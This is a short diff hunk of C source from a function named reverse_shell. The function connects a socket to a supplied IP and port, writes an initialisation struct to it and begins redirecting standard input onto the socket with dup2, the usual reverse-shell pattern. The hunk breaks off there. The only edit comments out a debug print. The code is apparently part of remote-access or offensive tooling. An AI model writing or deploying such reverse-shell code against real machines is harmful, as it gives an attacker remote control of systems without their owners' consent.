@@ -377,7 +377,7 @@ int reverse_shell(int port, char*ip, char ** argv){
 
   connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
   struct init_struct init = create_init_struct(argv);
-  print_init_struct(&init);
+  // print_init_struct(&init);
   write(sockt, &init, sizeof(struct init_struct));
   printf("wrote the thing to the socket\n");
   dup2(sockt, 0);
